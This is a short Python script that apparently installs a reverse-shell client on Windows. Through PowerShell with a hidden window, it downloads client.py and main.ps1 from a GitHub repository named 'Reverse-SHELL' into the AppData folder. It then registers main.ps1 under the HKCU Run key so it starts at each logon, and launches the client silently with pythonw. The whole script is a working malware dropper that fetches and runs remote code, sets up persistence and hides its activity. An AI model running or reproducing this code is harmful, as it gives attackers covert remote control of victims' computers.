import os, sys, subprocess

username = os.environ.get('USERNAME')
path = os.environ['appdata']
ps1_path = path + '\\main.ps1'
file_path = path + '\\client.pyw'
src_path = path + '\\src'
script_path = src_path + '\\Script'

################################################ setup #################################################################
def setup():
    # download client.py file
    subprocess.call(
        f'powershell.exe -WindowStyle hidden invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/client.py" -outfile {file_path}',
        shell=True)
    # download main.ps1 file
    subprocess.call(
        f'powershell.exe -WindowStyle hidden invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.ps1" -outfile {ps1_path}',
        shell=True)
    # reg add main.ps1 file
    subprocess.call(
            'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /d "' + ps1_path + '"',
            shell=True)
    # run client.py file
    subprocess.call(f'powershell.exe pythonw {file_path}',
                    shell=True)
################################################ done ##################################################################
# Running code ...
if __name__ == '__main__':
    setup()
